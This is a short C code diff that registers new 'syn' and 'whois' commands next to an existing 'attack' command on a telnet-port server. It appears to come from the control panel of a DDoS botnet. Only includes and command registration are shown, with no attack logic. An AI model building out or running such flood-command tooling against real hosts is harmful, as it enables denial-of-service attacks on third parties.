@@ -8,6 +8,8 @@
 #include "commands/echo_command.h"
 #include "commands/attack_command.h"
 #include "commands/help_command.h"
+#include "commands/attack/syn_command.h"
+#include "commands/info/whois.h"
 
 #define PORT 23
 #define TCP 8080
@@ -60,6 +62,8 @@ int main() {
     registerCommand("help", executeHelpCommand);
     registerCommand("echo", executeEchoCommand);
     registerCommand("attack", executeAttackcommand);
+    registerCommand("syn", executeSyncommand);
+    registerCommand("whois", executeWhoiscommand);
 
     serverSocket = socket(AF_INET, SOCK_STREAM, 0);
     if (serverSocket == -1) {
